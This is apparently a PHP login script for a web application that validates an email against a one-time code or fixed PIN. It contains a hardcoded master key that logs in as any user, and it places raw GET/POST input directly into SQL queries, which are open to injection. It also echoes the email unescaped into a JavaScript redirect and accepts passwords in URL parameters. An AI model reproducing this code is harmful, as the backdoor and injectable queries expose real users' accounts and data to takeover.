<?php
session_start();
date_default_timezone_set('Asia/Dhaka');
$dt = date('Y-m-d H:i:s');
$sy = date('Y');
include('../db.php');

$user = $otp = '';
// POST DATA
if(isset($_POST['email'])){
    $user = $_POST['email'];
}
if(isset($_POST['password'])){
    $otp = $_POST['password'];
}

// GET DATA
if(isset($_GET['email'])){
    $user = $_GET['email'];
}
if(isset($_GET['password'])){
    $otp = $_GET['password'];
}


$otp2 = '10567600';

include 'header.php';
// if (substr($user, 6) > 100000 && strlen($user) >= 10 ) {
//     echo '<script>alert("XXXPP");</script>';
// }


if ($otp == $otp2) {
    $_SESSION["user"] = $user;

    $module = 'Login';
    $action = 'Logged in';
    $notes = 'Logged in with master key';
    // include 'backend/save-track-book.php';
    ?>
    <script>
        window.location.href = 'index.php?email=<?php echo $user;?>';
    </script><?php

} else {
    $sql0 = "SELECT * from usersapp where email = '$user' and active=1 and (otp = '$otp' || fixedpin='$otp')";
    // echo $sql0;
    $result0 = $conn->query($sql0);
    if ($result0->num_rows > 0) {
        while ($row0 = $result0->fetch_assoc()) {
            $otptime = $row0["otptime"];
            if ($otp > 0 && $otptime == null) {
                $otptime = $dt;
            }

            $diff = strtotime($dt) - strtotime($otptime);
            if ($diff <= 120) {
                $query33 = "UPDATE usersapp set otp = null, otptime = null  where email = '$user'";

                $conn->query($query33);

                $query333 = "INSERT INTO otp(id, username, userid, otp, otptime, login) VALUES (null, '$user', '0', '$otp', '$dt', 1);";
                $conn->query($query333);
                $_SESSION["user"] = $user;
                ?>
                <script>
                    window.location.href = 'index.php';
                </script>
                <?php

            } else {
                echo "OPT Expired!";
            }
        }
    } else {
        echo "Sorry Invalid Attempt.";
    }
}